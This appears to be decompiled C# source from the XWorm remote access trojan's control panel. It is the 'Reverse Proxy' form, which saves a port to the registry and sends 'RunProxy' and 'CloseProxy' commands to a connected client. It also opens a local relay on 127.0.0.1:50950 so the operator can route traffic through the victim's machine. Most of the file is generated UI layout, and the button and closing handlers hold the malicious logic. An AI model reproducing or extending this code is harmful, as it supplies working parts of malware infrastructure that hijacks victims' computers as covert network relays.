#define DEBUG
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Guna.UI2.WinForms;
using Microsoft.VisualBasic.CompilerServices;
using XWorm.My;

namespace XWorm;

[DesignerGenerated]
public class Proxy : Form
{
	private enum Enum0
	{
		ProcessDPIUnaware,
		ProcessSystemDPIAware,
		ProcessPerMonitorDPIAware
	}

	private IContainer components;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Timer1")]
	private System.Windows.Forms.Timer _Timer1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Guna2TextBox4")]
	private Guna2TextBox _Guna2TextBox4;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Guna2GradientButton1")]
	private Guna2GradientButton _Guna2GradientButton1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Guna2GradientButton2")]
	private Guna2GradientButton _Guna2GradientButton2;

	private List<GClass7> gclass7s_0;

	public static bool bool_0;

	public static bool bool_1;

	private Random random_0;

	public GClass5 gclass5_0;

	public string string_0;

	[field: AccessedThroughProperty("Label6")]
	public Label Label6
	;

	[field: AccessedThroughProperty("Label3")]
	public Label Label3
	;


	[field: AccessedThroughProperty("Label2")]
	public Label Label2
	;

	public System.Windows.Forms.Timer Timer1
	 ;
	[field: AccessedThroughProperty("PictureBox1")]
	public PictureBox PictureBox1
	 ;

	[field: AccessedThroughProperty("Label1")]
	public Label Label1
	 ;

	[field: AccessedThroughProperty("Label4")]
	public Label Label4
	 ;

	[field: AccessedThroughProperty("Panel1")]
	public Panel Panel1
	 ;

	[field: AccessedThroughProperty("Panel2")]
	public Panel Panel2
	 ;

	public Guna2TextBox Guna2TextBox4
	;

	public Guna2GradientButton Guna2GradientButton1
	;

	[field: AccessedThroughProperty("Guna2TextBox2")]
	public Guna2TextBox Guna2TextBox2
	;

	[field: AccessedThroughProperty("Guna2TextBox1")]
	public Guna2TextBox Guna2TextBox1
	;

	[field: AccessedThroughProperty("Guna2TextBox3")]
	public Guna2TextBox Guna2TextBox3
	;

	public Guna2GradientButton Guna2GradientButton2
	;

	public Proxy()
	{
		base.Load += Proxy_Load;
		base.FormClosing += Proxy_FormClosing;
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	[System.Diagnostics.DebuggerStepThrough]
	private void InitializeComponent()
	{
		this.components = new System.ComponentModel.Container();
		System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(XWorm.Proxy));
		this.Label6 = new System.Windows.Forms.Label();
		this.Label3 = new System.Windows.Forms.Label();
		this.Label2 = new System.Windows.Forms.Label();
		this.Timer1 = new System.Windows.Forms.Timer(this.components);
		this.PictureBox1 = new System.Windows.Forms.PictureBox();
		this.Label1 = new System.Windows.Forms.Label();
		this.Label4 = new System.Windows.Forms.Label();
		this.Panel1 = new System.Windows.Forms.Panel();
		this.Panel2 = new System.Windows.Forms.Panel();
		this.Guna2TextBox4 = new Guna.UI2.WinForms.Guna2TextBox();
		this.Guna2GradientButton1 = new Guna.UI2.WinForms.Guna2GradientButton();
		this.Guna2TextBox1 = new Guna.UI2.WinForms.Guna2TextBox();
		this.Guna2TextBox2 = new Guna.UI2.WinForms.Guna2TextBox();
		this.Guna2TextBox3 = new Guna.UI2.WinForms.Guna2TextBox();
		this.Guna2GradientButton2 = new Guna.UI2.WinForms.Guna2GradientButton();
		((System.ComponentModel.ISupportInitialize)this.PictureBox1).BeginInit();
		this.Panel1.SuspendLayout();
		this.Panel2.SuspendLayout();
		base.SuspendLayout();
		this.Timer1.Tick += new System.EventHandler(Timer1_Tick);
		this.Guna2TextBox4.KeyDown += new System.Windows.Forms.KeyEventHandler(Guna2TextBox4_KeyDown);
		this.Guna2GradientButton1.Click += new System.EventHandler(Guna2GradientButton1_Click);
		this.Guna2GradientButton2.Click += new System.EventHandler(Guna2GradientButton2_Click);
		this.Label6.AutoSize = true;
		this.Label6.Font = new System.Drawing.Font("Tahoma", 8.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.Label6.ForeColor = System.Drawing.Color.Black;
		this.Label6.Location = new System.Drawing.Point(19, 76);
		this.Label6.Name = "Label6";
		this.Label6.Size = new System.Drawing.Size(61, 13);
		this.Label6.TabIndex = 10;
		this.Label6.Text = "ClientPort :";
		this.Label3.AutoSize = true;
		this.Label3.Font = new System.Drawing.Font("Tahoma", 8.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.Label3.ForeColor = System.Drawing.Color.Black;
		this.Label3.Location = new System.Drawing.Point(38, 103);
		this.Label3.Name = "Label3";
		this.Label3.Size = new System.Drawing.Size(42, 13);
		this.Label3.TabIndex = 8;
		this.Label3.Text = "Proxy :";
		this.Label2.AutoSize = true;
		this.Label2.Font = new System.Drawing.Font("Tahoma", 8.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.Label2.ForeColor = System.Drawing.Color.Black;
		this.Label2.Location = new System.Drawing.Point(17, 49);
		this.Label2.Name = "Label2";
		this.Label2.Size = new System.Drawing.Size(63, 13);
		this.Label2.TabIndex = 7;
		this.Label2.Text = "ClientHost :";
		this.Timer1.Enabled = true;
		this.Timer1.Interval = 1000;
		this.PictureBox1.Location = new System.Drawing.Point(3, 3);
		this.PictureBox1.Name = "PictureBox1";
		this.PictureBox1.Size = new System.Drawing.Size(35, 25);
		this.PictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
		this.PictureBox1.TabIndex = 16;
		this.PictureBox1.TabStop = false;
		this.Label1.AutoSize = true;
		this.Label1.Font = new System.Drawing.Font("Tahoma", 8.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.Label1.ForeColor = System.Drawing.Color.Black;
		this.Label1.Location = new System.Drawing.Point(44, 10);
		this.Label1.Name = "Label1";
		this.Label1.Size = new System.Drawing.Size(15, 13);
		this.Label1.TabIndex = 17;
		this.Label1.Text = "..";
		this.Label4.AutoSize = true;
		this.Label4.ForeColor = System.Drawing.Color.Black;
		this.Label4.Location = new System.Drawing.Point(40, 66);
		this.Label4.Name = "Label4";
		this.Label4.Size = new System.Drawing.Size(34, 13);
		this.Label4.TabIndex = 18;
		this.Label4.Text = "Port :";
		this.Panel1.Controls.Add(this.Guna2GradientButton1);
		this.Panel1.Controls.Add(this.Guna2TextBox4);
		this.Panel1.Controls.Add(this.Label4);
		this.Panel1.Dock = System.Windows.Forms.DockStyle.Fill;
		this.Panel1.Location = new System.Drawing.Point(0, 0);
		this.Panel1.Name = "Panel1";
		this.Panel1.Size = new System.Drawing.Size(333, 177);
		this.Panel1.TabIndex = 21;
		this.Panel2.Controls.Add(this.Panel1);
		this.Panel2.Controls.Add(this.Guna2GradientButton2);
		this.Panel2.Controls.Add(this.Guna2TextBox2);
		this.Panel2.Controls.Add(this.Guna2TextBox1);
		this.Panel2.Controls.Add(this.Label6);
		this.Panel2.Controls.Add(this.Label3);
		this.Panel2.Controls.Add(this.Guna2TextBox3);
		this.Panel2.Controls.Add(this.Label2);
		this.Panel2.Controls.Add(this.PictureBox1);
		this.Panel2.Controls.Add(this.Label1);
		this.Panel2.Dock = System.Windows.Forms.DockStyle.Fill;
		this.Panel2.Location = new System.Drawing.Point(0, 0);
		this.Panel2.Name = "Panel2";
		this.Panel2.Size = new System.Drawing.Size(333, 177);
		this.Panel2.TabIndex = 22;
		this.Guna2TextBox4.BorderColor = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2TextBox4.BorderRadius = 3;
		this.Guna2TextBox4.Cursor = System.Windows.Forms.Cursors.IBeam;
		this.Guna2TextBox4.DefaultText = "8000";
		this.Guna2TextBox4.DisabledState.BorderColor = System.Drawing.Color.FromArgb(208, 208, 208);
		this.Guna2TextBox4.DisabledState.FillColor = System.Drawing.Color.FromArgb(226, 226, 226);
		this.Guna2TextBox4.DisabledState.ForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
		this.Guna2TextBox4.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
		this.Guna2TextBox4.FocusedState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
		this.Guna2TextBox4.Font = new System.Drawing.Font("Segoe UI", 9f);
		this.Guna2TextBox4.ForeColor = System.Drawing.Color.Black;
		this.Guna2TextBox4.HoverState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
		this.Guna2TextBox4.Location = new System.Drawing.Point(80, 63);
		this.Guna2TextBox4.Name = "Guna2TextBox4";
		this.Guna2TextBox4.PasswordChar = '\0';
		this.Guna2TextBox4.PlaceholderForeColor = System.Drawing.Color.Black;
		this.Guna2TextBox4.PlaceholderText = "";
		this.Guna2TextBox4.SelectedText = "";
		this.Guna2TextBox4.Size = new System.Drawing.Size(197, 21);
		this.Guna2TextBox4.TabIndex = 50;
		this.Guna2GradientButton1.BorderRadius = 4;
		this.Guna2GradientButton1.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
		this.Guna2GradientButton1.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
		this.Guna2GradientButton1.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
		this.Guna2GradientButton1.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(169, 169, 169);
		this.Guna2GradientButton1.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
		this.Guna2GradientButton1.FillColor2 = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2GradientButton1.Font = new System.Drawing.Font("Segoe UI", 9f);
		this.Guna2GradientButton1.ForeColor = System.Drawing.Color.White;
		this.Guna2GradientButton1.ImageSize = new System.Drawing.Size(17, 17);
		this.Guna2GradientButton1.Location = new System.Drawing.Point(80, 90);
		this.Guna2GradientButton1.Name = "Guna2GradientButton1";
		this.Guna2GradientButton1.Size = new System.Drawing.Size(197, 24);
		this.Guna2GradientButton1.TabIndex = 101;
		this.Guna2GradientButton1.Text = "Start";
		this.Guna2TextBox1.BorderColor = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2TextBox1.BorderRadius = 3;
		this.Guna2TextBox1.Cursor = System.Windows.Forms.Cursors.IBeam;
		this.Guna2TextBox1.DefaultText = "";
		this.Guna2TextBox1.DisabledState.BorderColor = System.Drawing.Color.FromArgb(208, 208, 208);
		this.Guna2TextBox1.DisabledState.FillColor = System.Drawing.Color.FromArgb(226, 226, 226);
		this.Guna2TextBox1.DisabledState.ForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
		this.Guna2TextBox1.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
		this.Guna2TextBox1.FocusedState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
		this.Guna2TextBox1.Font = new System.Drawing.Font("Segoe UI", 9f);
		this.Guna2TextBox1.ForeColor = System.Drawing.Color.Black;
		this.Guna2TextBox1.HoverState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
		this.Guna2TextBox1.Location = new System.Drawing.Point(86, 46);
		this.Guna2TextBox1.Name = "Guna2TextBox1";
		this.Guna2TextBox1.PasswordChar = '\0';
		this.Guna2TextBox1.PlaceholderForeColor = System.Drawing.Color.Black;
		this.Guna2TextBox1.PlaceholderText = "";
		this.Guna2TextBox1.ReadOnly = true;
		this.Guna2TextBox1.SelectedText = "";
		this.Guna2TextBox1.Size = new System.Drawing.Size(221, 21);
		this.Guna2TextBox1.TabIndex = 102;
		this.Guna2TextBox2.BorderColor = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2TextBox2.BorderRadius = 3;
		this.Guna2TextBox2.Cursor = System.Windows.Forms.Cursors.IBeam;
		this.Guna2TextBox2.DefaultText = "";
		this.Guna2TextBox2.DisabledState.BorderColor = System.Drawing.Color.FromArgb(208, 208, 208);
		this.Guna2TextBox2.DisabledState.FillColor = System.Drawing.Color.FromArgb(226, 226, 226);
		this.Guna2TextBox2.DisabledState.ForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
		this.Guna2TextBox2.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
		this.Guna2TextBox2.FocusedState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
		this.Guna2TextBox2.Font = new System.Drawing.Font("Segoe UI", 9f);
		this.Guna2TextBox2.ForeColor = System.Drawing.Color.Black;
		this.Guna2TextBox2.HoverState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
		this.Guna2TextBox2.Location = new System.Drawing.Point(86, 73);
		this.Guna2TextBox2.Name = "Guna2TextBox2";
		this.Guna2TextBox2.PasswordChar = '\0';
		this.Guna2TextBox2.PlaceholderForeColor = System.Drawing.Color.Black;
		this.Guna2TextBox2.PlaceholderText = "";
		this.Guna2TextBox2.ReadOnly = true;
		this.Guna2TextBox2.SelectedText = "";
		this.Guna2TextBox2.Size = new System.Drawing.Size(221, 21);
		this.Guna2TextBox2.TabIndex = 103;
		this.Guna2TextBox3.BorderColor = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2TextBox3.BorderRadius = 3;
		this.Guna2TextBox3.Cursor = System.Windows.Forms.Cursors.IBeam;
		this.Guna2TextBox3.DefaultText = "";
		this.Guna2TextBox3.DisabledState.BorderColor = System.Drawing.Color.FromArgb(208, 208, 208);
		this.Guna2TextBox3.DisabledState.FillColor = System.Drawing.Color.FromArgb(226, 226, 226);
		this.Guna2TextBox3.DisabledState.ForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
		this.Guna2TextBox3.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
		this.Guna2TextBox3.FocusedState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
		this.Guna2TextBox3.Font = new System.Drawing.Font("Segoe UI", 9f);
		this.Guna2TextBox3.ForeColor = System.Drawing.Color.Black;
		this.Guna2TextBox3.HoverState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
		this.Guna2TextBox3.Location = new System.Drawing.Point(86, 100);
		this.Guna2TextBox3.Name = "Guna2TextBox3";
		this.Guna2TextBox3.PasswordChar = '\0';
		this.Guna2TextBox3.PlaceholderForeColor = System.Drawing.Color.Black;
		this.Guna2TextBox3.PlaceholderText = "";
		this.Guna2TextBox3.ReadOnly = true;
		this.Guna2TextBox3.SelectedText = "";
		this.Guna2TextBox3.Size = new System.Drawing.Size(221, 21);
		this.Guna2TextBox3.TabIndex = 104;
		this.Guna2GradientButton2.BorderRadius = 4;
		this.Guna2GradientButton2.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
		this.Guna2GradientButton2.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
		this.Guna2GradientButton2.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
		this.Guna2GradientButton2.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(169, 169, 169);
		this.Guna2GradientButton2.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
		this.Guna2GradientButton2.FillColor2 = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2GradientButton2.Font = new System.Drawing.Font("Segoe UI", 9f);
		this.Guna2GradientButton2.ForeColor = System.Drawing.Color.White;
		this.Guna2GradientButton2.Image = (System.Drawing.Image)resources.GetObject("Guna2GradientButton2.Image");
		this.Guna2GradientButton2.ImageAlign = System.Windows.Forms.HorizontalAlignment.Left;
		this.Guna2GradientButton2.ImageSize = new System.Drawing.Size(17, 17);
		this.Guna2GradientButton2.Location = new System.Drawing.Point(13, 136);
		this.Guna2GradientButton2.Name = "Guna2GradientButton2";
		this.Guna2GradientButton2.Size = new System.Drawing.Size(309, 27);
		this.Guna2GradientButton2.TabIndex = 102;
		this.Guna2GradientButton2.Text = "Disconnect";
		base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		this.BackColor = System.Drawing.Color.White;
		base.ClientSize = new System.Drawing.Size(333, 177);
		base.Controls.Add(this.Panel2);
		base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
		base.Name = "Proxy";
		this.Text = "Reverse Proxy";
		((System.ComponentModel.ISupportInitialize)this.PictureBox1).EndInit();
		this.Panel1.ResumeLayout(false);
		this.Panel1.PerformLayout();
		this.Panel2.ResumeLayout(false);
		this.Panel2.PerformLayout();
		base.ResumeLayout(false);
	}

	private void Proxy_Load(object sender, EventArgs e)
	{
		try
		{
			if (Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(MyProject.Computer.Registry.GetValue(GClass19.string_4, "ProxyPort", null), null, TextCompare: false))))
			{
				Guna2TextBox4.Text = Conversions.ToString(MyProject.Computer.Registry.GetValue(GClass19.string_4, "ProxyPort", null));
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Debug.WriteLine(ex.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void Proxy_FormClosing(object sender, FormClosingEventArgs e)
	{
		try
		{
			byte[] array = Module0.smethod_6("CloseProxy");
			GClass5 gClass = gclass5_0;
			ThreadPool.QueueUserWorkItem([SpecialName][DebuggerHidden] (object a0) =>
			{
				gClass.method_1((byte[])a0);
			}, array);
			GClass7.smethod_0();
			GClass6.smethod_0();
			Class0.smethod_0();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		try
		{
			if (!gclass5_0.bool_0)
			{
				Close();
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Debug.WriteLine(ex.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void Guna2GradientButton1_Click(object sender, EventArgs e)
	{
		try
		{
			if (!string.IsNullOrEmpty(Guna2TextBox4.Text) && Versioned.IsNumeric(Guna2TextBox4.Text))
			{
				try
				{
					MyProject.Computer.Registry.SetValue(GClass19.string_4, "ProxyPort", Guna2TextBox4.Text);
				}
				catch (Exception ex)
				{
					ProjectData.SetProjectError(ex);
					Debug.WriteLine(ex.Message);
					ProjectData.ClearProjectError();
				}
				gclass7s_0 = new List<GClass7>();
				random_0 = new Random();
				Main.gclass6s_0 = new List<GClass6>();
				GClass7 gClass = new GClass7();
				gClass.method_0(Conversions.ToInteger(Guna2TextBox4.Text), checked(gclass7s_0.Count - 1), Convert.ToInt32(Guna2TextBox4.Text));
				gclass7s_0.Add(gClass);
				string text = string_0 + ":" + Guna2TextBox4.Text;
				Guna2TextBox1.Text = string_0;
				Guna2TextBox2.Text = Guna2TextBox4.Text;
				Guna2TextBox3.Text = "127.0.0.1:" + Conversions.ToString(50950);
				GClass6 item = new GClass6(50950, text.Substring(0, text.IndexOf(":")), text);
				Main.gclass6s_0.Add(item);
				Panel1.Visible = false;
				Panel2.Visible = true;
				byte[] array = Module0.smethod_6("RunProxy" + GClass19.string_0 + Guna2TextBox4.Text + GClass19.string_0 + string_0);
				GClass5 gClass2 = gclass5_0;
				ThreadPool.QueueUserWorkItem([SpecialName][DebuggerHidden] (object a0) =>
				{
					gClass2.method_1((byte[])a0);
				}, array);
			}
		}
		catch (Exception ex2)
		{
			ProjectData.SetProjectError(ex2);
			MessageBox.Show(ex2.Message);
			Close();
			ProjectData.ClearProjectError();
		}
	}

	private void Guna2GradientButton2_Click(object sender, EventArgs e)
	{
		Close();
	}

	private void Guna2TextBox4_KeyDown(object sender, KeyEventArgs e)
	{
		if (e.KeyCode == Keys.Return)
		{
			e.SuppressKeyPress = true;
			Guna2GradientButton1.PerformClick();
		}
	}
}